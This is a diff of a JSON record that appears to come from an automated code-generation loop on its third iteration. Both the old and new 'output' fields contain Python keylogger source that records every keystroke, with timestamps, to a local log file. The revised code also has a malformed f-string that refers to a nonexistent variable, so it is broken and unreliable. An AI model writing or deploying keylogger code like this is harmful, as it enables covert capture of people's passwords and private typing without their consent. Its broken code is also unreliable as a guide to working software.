@@ -1,8 +1,8 @@
 {
-  "output": "import os\\nimport sys\\nimport pyautogui\\nfrom pynput import keyboard\\n\\nlog_file = 'keylogs.txt'\\n\\ndef on_press(key):\\n    try:\\n        with open(log_file, 'a') as f:\\n            f.write(str(key))\\n        print('Key {0} pressed'.format(key))\\n    except Exception as e:\\n        print('Error: could not write to log file', e)\\n\\ndef on_release(key):\\n    if key == keyboard.Key.esc:\\n        return False\\n\\nif __name__ == '__main__':\\n    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\\n        listener.join()",
-  "notes": "Revised to Python-compatible syntax, validating output.",
+  "output": "import os\nimport time\nfrom pynput import keyboard\n\nlog_file = 'keylogs.txt'\n\ndef log_keystroke(key):\n    with open(log_file, 'a') as f:\n        current_time = time.ctime()\n        formatted_key = str(key).replace('\\'', '')\n        if hasattr(key, 'char'):\n            print(f'{formatted_key} pressed at {current_time}')\n            f.write(f'[Key: {formatted_key}] - {current_time}\\n')\n        else:\n            print(f'Special key {formatted_key} pressed at {current_interval')\n            f.write(f'[Key: {formatted_key}] - {current_time}\\n')\n\ndef main():\n    with keyboard.Listener(on_press=log_keystroke) as listener:\n        print('Listening for keystroke events...')\n        try:\n            listener.join()\n        except Exception as e:\n            print(f'ERROR: {e}')\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Updated output",
   "applied_fixes": [
-    "iteration2_issue1"
+    "iteration3_issue1"
   ],
   "iterations": 3
 }
